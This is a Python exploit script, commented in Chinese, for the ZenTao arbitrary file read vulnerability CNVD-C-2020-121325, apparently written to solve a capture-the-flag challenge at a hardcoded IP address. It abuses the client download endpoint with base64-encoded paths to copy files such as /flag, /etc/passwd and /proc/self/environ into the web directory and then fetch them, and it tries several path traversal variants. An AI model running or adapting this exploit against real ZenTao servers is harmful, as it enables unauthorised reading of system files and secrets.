#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 - 任意文件读取利用
思路：利用 f=download 将服务器本地的 /flag "下载"（复制）到 web 目录
关键发现：data:// 协议被禁用，但本地文件读取仍然可用！
"""

import requests
import base64
import time

def solve_via_local_file_read():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - 本地文件读取模式              ║
║      利用漏洞将服务器本地文件复制到 web 目录                ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 尝试访问一下首页，建立 session
    print("[*] 建立 Session...")
    try:
        session.get(f"{base_url}/zentao/", timeout=5)
        print("    ✓ Session 已建立\n")
    except Exception as e:
        print(f"    警告: {e}\n")

    # 可能的 Flag 路径
    targets = [
        "/flag",
        "/flag.txt",
        "/tmp/flag",
        "/var/www/html/flag",
        "/var/www/html/flag.txt",
        "flag",  # 相对路径
        "../flag",
        "../../flag",
        "../../../../flag",  # 尝试跳出 web 目录
        "/proc/self/environ",  # 也许 flag 在环境变量里
        "/etc/passwd",  # 测试文件读取是否工作
    ]

    for target_file in targets:
        print("=" * 70)
        print(f"尝试读取: {target_file}")
        print("=" * 70)

        # 1. Base64 编码目标路径 (作为 link 参数)
        link_param = base64.b64encode(target_file.encode()).decode()

        # 构造保存的文件名
        save_filename = f"dump_{abs(hash(target_file)) % 10000}.txt"

        params = {
            "m": "client",
            "f": "download",
            "link": link_param,
            "fileName": save_filename
        }

        upload_url = f"{base_url}/zentao/index.php"

        try:
            print(f"[*] Link 参数: {link_param}")
            print(f"[*] 保存为: {save_filename}")
            print(f"[*] 发送请求...")

            res = session.get(upload_url, params=params, timeout=10)
            print(f"    上传响应: {res.status_code}")

            # 2. 访问保存的文件
            dump_url = f"{base_url}/zentao/data/client/1/{save_filename}"
            print(f"\n[*] 访问结果文件: {dump_url}")

            time.sleep(1)  # 等待文件系统同步

            res = session.get(dump_url, timeout=10)

            if res.status_code == 200:
                content_len = len(res.content)
                print(f"    状态: 200 OK")
                print(f"    长度: {content_len} bytes")

                if content_len > 0:
                    print("\n" + "=" * 70)
                    print("✓ 文件内容:")
                    print("=" * 70)
                    # 尝试解码为文本
                    try:
                        content = res.content.decode('utf-8', errors='replace')
                        print(content)
                    except:
                        print(f"Binary content: {res.content[:200]}")
                    print("=" * 70)

                    # 检查是否包含 flag
                    if "flag{" in res.text.lower() or "ctf{" in res.text.lower():
                        print("\n🚩🚩🚩 Flag 找到! 🚩🚩🚩")
                        print(f"\n最终答案: {res.text}")
                        return res.text
                    elif content_len > 10:
                        print("\n✓ 成功读取文件内容 (文件读取功能正常)")
                else:
                    print("    ✗ 文件为空 (目标文件可能不存在或不可读)")
            else:
                print(f"    ✗ 访问失败: {res.status_code}")

        except Exception as e:
            print(f"    ✗ 错误: {e}")

        print()  # 空行分隔

    print("\n[-] 所有路径都已尝试完毕")
    return None


if __name__ == "__main__":
    print("[*] 启动任意文件读取攻击...\n")
    result = solve_via_local_file_read()

    if result:
        print("\n" + "=" * 70)
        print("任务完成! 成功获取 Flag:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[*] 未能获取 Flag")
        print("[*] 建议:")
        print("    1. 检查是否有 open_basedir 限制")
        print("    2. Flag 可能在数据库中而不是文件系统")
        print("    3. 尝试其他文件路径或环境变量")
